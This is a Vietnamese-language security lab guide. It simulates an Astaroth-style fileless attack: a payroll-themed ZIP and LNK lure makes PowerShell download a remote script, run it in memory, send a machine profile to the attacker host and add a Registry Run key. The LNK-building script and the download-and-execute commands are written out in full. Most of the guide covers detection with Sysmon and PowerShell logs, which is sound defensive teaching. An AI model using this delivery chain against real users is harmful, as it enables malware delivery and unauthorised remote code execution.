# 02 - Thực hiện lab Astaroth-inspired trên 2 máy

## 1. Mục tiêu bài lab

Bài lab mô phỏng một chiến dịch Astaroth-inspired theo hướng an toàn, lấy cảm hứng từ đặc trưng Living-off-the-Land, in-memory execution, thu thập thông tin máy nạn nhân và persistence của Astaroth.

Khác với phiên bản lab cũ, payload trong bài lab này không được tải xuống ổ đĩa của máy nạn nhân dưới dạng file `.ps1`, `.exe`, `.dll` hay file mã hóa trung gian. Victim chỉ có ZIP và LNK đóng vai trò delivery/launcher. Nội dung payload được PowerShell tải qua HTTP, giữ trong biến và thực thi bằng ScriptBlock trong bộ nhớ.

Chuỗi mong muốn:

```text
Victim tải ZIP
  -> giải nén
  -> click ThongBaoLuong_Q3.lnk
  -> LNK gọi powershell.exe
  -> PowerShell kết nối máy attacker
  -> nhận nội dung payload.ps1 qua HTTP
  -> payload nằm trong RAM
  -> PowerShell thực thi payload trực tiếp
  -> thu thập thông tin máy không nhạy cảm
  -> gửi JSON profile về attacker qua POST /collect trên port 8001
  -> tạo Registry Run key vô hại để mô phỏng persistence
  -> không hiển thị kết quả rõ ràng cho victim
  -> attacker xác nhận thành công bằng file JSON nhận được
```

Người dùng chỉ thực hiện:

```text
Download ZIP
  -> Extract
  -> Double click LNK
```

Toàn bộ phần còn lại diễn ra tự động sau cú double-click.

## 2. Phạm vi và giới hạn an toàn

Lab có mô phỏng:

- Social engineering giả lập.
- File shortcut `.lnk`.
- PowerShell.
- HTTP download.
- In-memory execution.
- Thu thập thông tin máy không nhạy cảm.
- Gửi kết quả mô phỏng về attacker trong mạng lab.
- Registry Run key persistence vô hại.
- Sysmon logging.
- PowerShell Script Block Logging.

Lab không mô phỏng:

- DLL injection.
- Process injection.
- Alternate Data Streams.
- Credential theft.
- C2 thật.
- Obfuscation.
- AV bypass.
- Privilege escalation.

Payload chỉ thu thập thông tin hệ thống cơ bản như hostname, username, OS version, IP nội bộ và PowerShell version. Lab không thu thập password, cookie, token, clipboard, browser data hoặc tài liệu cá nhân.

## 3. Môi trường lab

```text
ATTACKER
Windows thật
IP: 192.168.141.1

File:
  C:\Fileless-Lab\payload.ps1
  C:\Fileless-Lab\ThongBaoLuong_Q3.zip

Service:
  Python static server :8000  (host ZIP và payload.ps1)
  Python collector server :8001 (nhận POST /collect)
```

```text
VICTIM
Windows VM
IP: 192.168.141.140

Công cụ:
  PowerShell
  Sysmon
  Event Viewer
```

Kiểm tra kết nối từ victim:

```powershell
ping 192.168.141.1
```

## 4. Chuẩn bị logging trên victim

### 4.1. Kiểm tra Sysmon

Chạy:

```powershell
Get-Service Sysmon*
```

Nếu đã cài đúng sẽ thấy service Sysmon đang chạy.

Mở:

```text
Event Viewer
  Applications and Services Logs
    Microsoft
      Windows
        Sysmon
          Operational
```

Ta quan tâm:

- Event ID 1: Process Creation.
- Event ID 3: Network Connection.
- Event ID 11: File Create.

### 4.2. Bật hoặc kiểm tra PowerShell Script Block Logging

Mở:

```text
Win + R
gpedit.msc
```

Nếu máy không có `gpedit.msc`, cài bằng CMD Administrator:

```cmd
FOR %i IN ("%SystemRoot%\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~*.mum") DO (DISM /Online /NoRestart /Add-Package:"%i")
```

```cmd
FOR %i IN ("%SystemRoot%\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientFolder-Package~*.mum") DO (DISM /Online /NoRestart /Add-Package:"%i")
```

Sau đó vào:

```text
Computer Configuration
  Administrative Templates
    Windows Components
      Windows PowerShell
        Turn on PowerShell Script Block Logging
```

Chọn:

```text
Enabled
```

Cập nhật policy:

```powershell
gpupdate /force
```

Log nằm tại:

```text
Event Viewer
  Applications and Services Logs
    Microsoft
      Windows
        PowerShell
          Operational
```

Event quan trọng:

- Event ID 4104.

### 4.3. Bật Process Creation Audit

Chạy PowerShell Administrator:

```powershell
auditpol /set /subcategory:"Process Creation" /success:enable
```

Kiểm tra:

```powershell
auditpol /get /subcategory:"Process Creation"
```

Sau đó có thể quan sát:

- Security Event ID 4688.

## 5. Chuẩn bị attacker

### 5.1. Tạo thư mục

Trên attacker:

```powershell
mkdir C:\Fileless-Lab
cd C:\Fileless-Lab
```

### 5.2. Tạo payload campaign v2

Tạo file:

```text
C:\Fileless-Lab\payload.ps1
```

Có thể copy file mẫu từ:

```text
D:\fileless malware\lab-files\attacker-web\payload.ps1
```

Payload v3 thực hiện các chức năng an toàn sau:

- Thu thập thông tin máy không nhạy cảm: hostname, username, domain/workgroup, OS version, PowerShell version, PID và IP nội bộ.
- Gửi JSON profile về attacker qua `POST /collect` trên port `8001`.
- Nếu mất mạng hoặc collector không chạy, lưu JSON profile tạm vào `%TEMP%\FilelessLab\queue`.
- Lần chạy sau nếu có mạng lại, gửi các file trong queue về attacker rồi xóa queue đã gửi thành công.
- Tạo Registry Run key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\FilelessLabDemo` để mô phỏng persistence và retry.

Chú ý:

- File `payload.ps1` chỉ tồn tại trên attacker.
- Trên victim, nội dung payload được nhận qua HTTP và giữ trong memory.
- Payload không lấy password, cookie, token, clipboard, browser data hoặc tài liệu cá nhân.
- Không tạo `payload.b64`.
- Không tạo `payload-decoded.ps1`.

### 5.3. Kiểm tra cú pháp payload

Payload silent không in kết quả ra màn hình victim. Trên attacker chỉ cần kiểm tra cú pháp trước khi đưa vào ZIP/LNK:

```powershell
powershell -NoProfile -Command "$code = Get-Content -Raw .\payload.ps1; [scriptblock]::Create($code) | Out-Null; 'payload parse ok'"
```

Phải thấy:

```text
payload parse ok
```

## 6. Tạo launcher LNK

### 6.1. Logic của launcher

Victim sẽ không tự gõ PowerShell. Shortcut `.lnk` sẽ gọi PowerShell và thực hiện logic:

```powershell
$x = Invoke-RestMethod 'http://192.168.141.1:8000/payload.ps1'
$sb = [ScriptBlock]::Create([string]$x)
& $sb
```

Ở đây không có:

```text
-OutFile
C:\Temp\payload.ps1
payload.b64
payload-decoded.ps1
```

Biến `$x` và `$sb` chỉ tồn tại trong memory của process PowerShell.

### 6.2. Tạo create_lnk.ps1

Trên attacker tạo file:

```text
C:\Fileless-Lab\create_lnk.ps1
```

Nội dung:

```powershell
$lnkPath = "C:\Fileless-Lab\ThongBaoLuong_Q3.lnk"

if (Test-Path -LiteralPath $lnkPath) {
    Remove-Item -LiteralPath $lnkPath -Force
}

$Shell = New-Object -ComObject WScript.Shell
$Shortcut = $Shell.CreateShortcut($lnkPath)

$Shortcut.TargetPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments = '-NoProfile -Command "$x = Invoke-RestMethod ''http://192.168.141.1:8000/payload.ps1''; $sb = [ScriptBlock]::Create([string]$x); & $sb"'
$Shortcut.WorkingDirectory = ""
$Shortcut.WindowStyle = 1
$Shortcut.Save()
```

Chạy:

```powershell
cd C:\Fileless-Lab
PowerShell -File .\create_lnk.ps1
```

Kiểm tra:

```powershell
dir *.lnk
```

Phải thấy:

```text
ThongBaoLuong_Q3.lnk
```

## 7. Tạo ZIP giả lập social engineering

Trong thư mục `C:\Fileless-Lab`, chạy:

```powershell
Compress-Archive -LiteralPath "C:\Fileless-Lab\ThongBaoLuong_Q3.lnk" -DestinationPath "C:\Fileless-Lab\ThongBaoLuong_Q3.zip" -Force
```

Kiểm tra:

```powershell
dir C:\Fileless-Lab
```

Phải có:

```text
payload.ps1
create_lnk.ps1
ThongBaoLuong_Q3.lnk
ThongBaoLuong_Q3.zip
```

## 8. Khởi động server trên attacker

Mở hai cửa sổ PowerShell trên attacker.

Terminal 1 - host ZIP và payload:

```powershell
cd C:\Fileless-Lab
python -m http.server 8000 --bind 192.168.141.1
```

Kết quả mong đợi:

```text
Serving HTTP on 192.168.141.1 port 8000
```

Terminal 2 - nhận profile JSON:

```powershell
cd C:\Fileless-Lab
python .\collect_server.py
```

Kết quả mong đợi:

```text
Collecting lab results under C:\Fileless-Lab\collections
Collector endpoint: http://192.168.141.1:8001/collect
POST /collect will be saved under collections/
```

Giữ cả hai cửa sổ này mở trong lúc chạy kịch bản online.

## 9. Kiểm tra web server từ victim

Trên victim mở trình duyệt:

```text
http://192.168.141.1:8000/
```

Phải thấy ít nhất:

```text
payload.ps1
ThongBaoLuong_Q3.zip
```

Ở bước này không cần tải `payload.ps1`. Mục đích chỉ là kiểm tra victim có truy cập được web server của attacker.

## 10. Thực hiện lab trên victim

Bước 1: Victim truy cập:

```text
http://192.168.141.1:8000/
```

Bước 2: Download:

```text
ThongBaoLuong_Q3.zip
```

Bước 3: Extract ZIP.

Sau khi extract sẽ thấy:

```text
ThongBaoLuong_Q3.lnk
```

Bước 4: Double-click:

```text
ThongBaoLuong_Q3.lnk
```

Từ đây victim không cần làm gì thêm.

## 11. Chuỗi xảy ra sau cú click

Sau khi victim double-click shortcut:

```text
explorer.exe
  -> powershell.exe
      -> HTTP GET /payload.ps1
      -> nhận response body
      -> lưu nội dung vào biến $x trong RAM
      -> tạo ScriptBlock
      -> execute ScriptBlock
      -> thu thập profile máy không nhạy cảm
      -> HTTP POST /collect trên port 8001
      -> tạo Registry Run key mô phỏng persistence
```

Luồng tổng quát:

```text
ThongBaoLuong_Q3.lnk
      |
      v
powershell.exe
      |
      | HTTP GET
      v
192.168.141.1:8000/payload.ps1
      |
      | response
      v
$x trong RAM
      |
      v
ScriptBlock::Create
      |
      v
collect victim profile
      |
      v
POST /collect
      |
      v
Registry Run key: FilelessLabDemo
```

## 12. Kết quả nhìn từ victim

Ở bản silent-victim-view, victim không thấy thông báo thành công, không thấy popup và không nhận được file `payload.ps1` trên disk. Nếu có cửa sổ PowerShell xuất hiện, nó chỉ xuất hiện rất ngắn rồi tự đóng do LNK không còn `Read-Host`.

Điều này mô phỏng tình huống người dùng chỉ nghĩ rằng mình vừa mở một file xác nhận bình thường. Trong báo cáo, không nên viết rằng payload “ẩn mình” hoặc “bypass bảo vệ”; câu đúng là:

```text
Payload không hiển thị kết quả cho victim. Bằng chứng thực thi được xác nhận từ attacker và từ log phòng thủ.
```

## 13. Kết quả nhìn từ attacker

Terminal 1, static server port `8000`, phải xuất hiện:

```text
GET /ThongBaoLuong_Q3.zip HTTP/1.1 200
GET /payload.ps1 HTTP/1.1 200
```

Terminal 2, collector server port `8001`, phải xuất hiện:

```text
POST /collect HTTP/1.1 200
[COLLECT] Saved victim profile to C:\Fileless-Lab\collections\victim-profile-...
```

Ý nghĩa:

- Request đầu tiên chứng minh victim tải ZIP.
- Request thứ hai chứng minh PowerShell trên victim lấy payload từ attacker.
- Request thứ ba chứng minh payload gửi profile JSON về attacker.

Kiểm tra file JSON attacker nhận được:

```powershell
dir C:\Fileless-Lab\collections
Get-Content C:\Fileless-Lab\collections\victim-profile-*.json
```

## 14. Kịch bản mất mạng và offline staging

Đây là phần giúp lab có chiều sâu hơn.

### 14.1. Mô phỏng mất mạng

Điểm quan trọng: không tắt server `8000`, vì LNK vẫn cần tải `payload.ps1` để payload có cơ hội chạy. Chỉ tắt collector server `8001`.

Mô phỏng mất mạng kênh gửi dữ liệu:

- Giữ Terminal 1 đang chạy `python -m http.server 8000 --bind 192.168.141.1`.
- Tạm dừng Terminal 2 `collect_server.py` bằng `Ctrl + C`.

Sau đó victim mở lại `ThongBaoLuong_Q3.lnk`.

Kỳ vọng:

- Attacker không có `POST /collect`.
- Attacker chưa nhận được file JSON mới.
- Victim vẫn không thấy popup/success rõ ràng.
- Payload vẫn chạy được vì vẫn tải được `payload.ps1` từ port `8000`.

### 14.2. Kiểm tra dữ liệu staging trên victim

Nếu lệnh dưới đây báo `path does not exist`, nguyên nhân thường là payload chưa chạy. Hãy kiểm tra lại Terminal 1 port `8000` vẫn đang chạy và static server có log `GET /payload.ps1`. Nếu tắt cả port `8000`, LNK không tải được payload nên sẽ không có thư mục queue.

Trên victim kiểm tra:

```powershell
dir "$env:TEMP\FilelessLab\queue"
Get-Content "$env:TEMP\FilelessLab\queue\victim-profile-*.json"
```

Kỳ vọng có file:

```text
%TEMP%\FilelessLab\queue\victim-profile-*.json
```

Ý nghĩa:

```text
Khi không gửi được dữ liệu về attacker, payload mô phỏng hành vi staging/cache dữ liệu thu thập được ở thư mục user-writable để chờ gửi lại.
```

### 14.3. Có mạng lại và gửi queue

Bật lại collector server:

```powershell
cd C:\Fileless-Lab
python .\collect_server.py
```

Chạy lại LNK hoặc đăng xuất/đăng nhập lại để Registry Run key mô phỏng persistence kích hoạt lại payload.

Kỳ vọng trên attacker:

```text
POST /collect HTTP/1.1 200
[COLLECT] Saved victim profile to C:\Fileless-Lab\collections\victim-profile-...
```

Sau khi gửi thành công, kiểm tra lại trên victim:

```powershell
dir "$env:TEMP\FilelessLab\queue"
```

Các file queue đã gửi thành công sẽ bị xóa.

## 15. Kiểm tra payload có tồn tại trên victim không

Đây là phần quan trọng nhất của lab.

Trên victim chạy:

```powershell
Get-ChildItem C:\ -Filter payload.ps1 -Recurse -ErrorAction SilentlyContinue
```

Kiểm tra tiếp:

```powershell
Get-ChildItem C:\ -Filter payload.exe -Recurse -ErrorAction SilentlyContinue
Get-ChildItem C:\ -Filter payload.dll -Recurse -ErrorAction SilentlyContinue
Get-ChildItem C:\ -Filter payload.b64 -Recurse -ErrorAction SilentlyContinue
Get-ChildItem C:\ -Filter payload-decoded.ps1 -Recurse -ErrorAction SilentlyContinue
```

Kỳ vọng:

- Không có `payload.ps1` liên quan đến lab trên victim.
- Không có `payload.exe`.
- Không có `payload.dll`.
- Không có `payload.b64`.
- Không có `payload-decoded.ps1`.

Victim vẫn có:

- `ThongBaoLuong_Q3.zip`.
- `ThongBaoLuong_Q3.lnk`.
- Có thể có `%TEMP%\FilelessLab\queue\victim-profile-*.json` nếu trước đó mất mạng.

Vì vậy không được viết rằng “không có file nào tồn tại trên victim”. Câu đúng là:

```text
Payload không được lưu thành file trên victim. ZIP và LNK chỉ đóng vai trò initial-access/launcher.
```

Nói ngắn gọn:

```text
ZIP     = delivery
LNK     = launcher
payload = memory only
```

Đây là fileless payload execution, không phải zero-file attack.

## 16. Kiểm tra persistence mô phỏng

Trên victim, kiểm tra Registry Run key:

```powershell
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object FilelessLabDemo
```

Kỳ vọng thấy value `FilelessLabDemo`. Value này gọi PowerShell để tải lại `payload.ps1` từ attacker khi user đăng nhập lại. Trong lab, mục đích là mô phỏng retry gửi queue khi mạng đã quay lại.

```text
powershell.exe -NoProfile -Command "try { ... Invoke-RestMethod 'http://192.168.141.1:8000/payload.ps1' ... } catch { }"
```

Ý nghĩa:

- Astaroth thật có thể dùng nhiều kỹ thuật để duy trì khả năng bám trụ hoặc tiếp tục hoạt động.
- Lab chỉ mô phỏng ý tưởng persistence bằng Registry Run key dễ thấy, dễ kiểm tra và dễ xóa.
- Đây là điểm tạo thêm log để blue team phân tích Registry modification.

Cleanup persistence:

```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "FilelessLabDemo" -ErrorAction SilentlyContinue
```

## 17. Phân tích Sysmon Event ID 1

Mở:

```text
Event Viewer
  Applications and Services Logs
    Microsoft
      Windows
        Sysmon
          Operational
```

Filter:

```text
Event ID 1
```

Tìm:

```text
powershell.exe
```

Quan sát:

- Image.
- CommandLine.
- ParentImage.
- ProcessId.
- ParentProcessId.
- User.
- UtcTime.

Process tree mong đợi:

```text
explorer.exe
  -> powershell.exe
```

Đây là dấu hiệu đáng chú ý: người dùng mở shortcut từ Explorer nhưng tiến trình được sinh ra lại là PowerShell.

## 18. Phân tích Sysmon Event ID 3

Filter:

```text
Event ID 3
```

Tìm event có:

```text
Image: powershell.exe
Destination: 192.168.141.1
Port: 8000
```

Ý nghĩa:

```text
powershell.exe
  -> TCP
  -> 192.168.141.1:8000
```

Đây là bằng chứng payload được lấy qua mạng.

Với kịch bản online, cũng nên tìm thêm kết nối đến collector:

```text
Image: powershell.exe
Destination: 192.168.141.1
Port: 8001
```

Đây là bằng chứng payload gửi JSON profile về attacker.

## 19. Phân tích PowerShell Event ID 4104

Đi tới:

```text
Event Viewer
  Applications and Services Logs
    Microsoft
      Windows
        PowerShell
          Operational
```

Filter:

```text
Event ID 4104
```

Tại đây có thể quan sát nội dung script được PowerShell xử lý. Điểm quan trọng:

- File system không có `payload.ps1` trên victim.
- PowerShell log vẫn có thể ghi lại nội dung script được xử lý.

Kết luận cần viết:

```text
Fileless không đồng nghĩa với không thể quan sát. Nếu bật logging đúng, defender vẫn có thể thấy dấu vết thực thi.
```

## 20. Phân tích Sysmon Event ID 11

Filter:

```text
Event ID 11
```

Kiểm tra xem có các file sau được tạo không:

```text
payload.ps1
payload.exe
payload.dll
payload.b64
payload-decoded.ps1
```

Kỳ vọng:

```text
Không có các file payload trên victim.
```

Tất nhiên vẫn có thể thấy:

```text
ThongBaoLuong_Q3.zip
ThongBaoLuong_Q3.lnk
```

vì đây là delivery và launcher.

## 21. Sáu bằng chứng quan trọng nhất

Bằng chứng 1:

```text
Sysmon Event ID 3:
powershell.exe -> 192.168.141.1:8000
```

Payload đã được lấy qua mạng.

Bằng chứng 2:

```text
PowerShell Event ID 4104:
Invoke-RestMethod
ScriptBlock::Create
```

Code đã được PowerShell xử lý/thực thi.

Bằng chứng 3:

```text
Collector server port 8001:
POST /collect HTTP/1.1 200
victim-profile-*.json
```

Payload đã gửi profile máy không nhạy cảm về attacker.

Bằng chứng 4:

```text
Registry:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\FilelessLabDemo
```

Payload đã mô phỏng persistence.

Bằng chứng 5:

```text
Offline staging:
%TEMP%\FilelessLab\queue\victim-profile-*.json
```

Khi mất mạng, profile được lưu tạm trên victim để chờ gửi lại.

Bằng chứng 6:

```text
Sysmon Event ID 11:
không có payload.ps1
không có payload.exe
không có payload.dll
```

Payload không được ghi thành file.

Công thức kết luận:

```text
Network delivery
  + Script execution
  + Victim profiling
  + Offline staging
  + Benign persistence simulation
  + No payload file
  = Astaroth-inspired campaign behavior
```

## 22. Cleanup sau lab

Trên victim, xóa ZIP/LNK đã tải về nếu cần:

```powershell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "FilelessLabDemo" -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\FilelessLab" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:USERPROFILE\Downloads\ThongBaoLuong_Q3.zip" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:USERPROFILE\Downloads\ThongBaoLuong_Q3" -Recurse -Force -ErrorAction SilentlyContinue
```

Trên attacker, nếu muốn dọn toàn bộ thư mục lab:

```powershell
Remove-Item -Path C:\Fileless-Lab -Recurse -Force
```

## 23. Checklist kết quả

- [ ] Victim tải được `ThongBaoLuong_Q3.zip`.
- [ ] Victim giải nén được `ThongBaoLuong_Q3.lnk`.
- [ ] Double-click LNK làm PowerShell chạy.
- [ ] Victim không thấy popup/success rõ ràng sau khi mở LNK.
- [ ] Static server port `8000` có request `GET /ThongBaoLuong_Q3.zip`.
- [ ] Static server port `8000` có request `GET /payload.ps1`.
- [ ] Collector server port `8001` có request `POST /collect`.
- [ ] Attacker nhận được `collections\victim-profile-*.json`.
- [ ] Khi mất mạng, victim có `%TEMP%\FilelessLab\queue\victim-profile-*.json`.
- [ ] Khi có mạng lại, queued profile được gửi về attacker.
- [ ] Victim có Registry Run key `FilelessLabDemo`.
- [ ] Sysmon có Event ID 1 cho `powershell.exe`.
- [ ] Sysmon có Event ID 3 từ `powershell.exe` đến `192.168.141.1:8000`.
- [ ] Sysmon có Event ID 3 từ `powershell.exe` đến `192.168.141.1:8001` khi collector online.
- [ ] PowerShell Operational có Event ID 4104.
- [ ] Không có payload `.ps1`, `.exe`, `.dll`, `.b64` hoặc `payload-decoded.ps1` được tạo trên victim.
- [ ] Đã cleanup Registry Run key `FilelessLabDemo`.
- [ ] Đã cleanup `%TEMP%\FilelessLab`.
